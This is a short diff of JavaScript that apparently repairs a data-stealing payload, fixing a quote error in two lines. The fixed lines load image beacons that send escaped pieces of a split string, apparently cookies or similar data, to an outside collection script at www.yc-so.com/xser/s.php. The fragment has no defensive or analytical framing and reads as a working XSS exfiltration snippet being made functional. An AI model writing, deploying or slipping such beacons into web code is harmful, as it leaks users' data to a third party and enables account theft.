@@ -22,8 +22,8 @@
             c4=c1.substring(clen2,c1.length );
            keep1 = new Image();
            keep2 = new Image();
-           keep1.src ='http://www.yc-so.com/xser/s.php?c="+escape(c2);
-           keep2.src ='http://www.yc-so.com/xser/s.php?c="+escape(c3);
+           keep1.src ='http://www.yc-so.com/xser/s.php?c='+escape(c2);
+           keep2.src ='http://www.yc-so.com/xser/s.php?c='+escape(c3);
 
             return c4;
         } catch (e) {
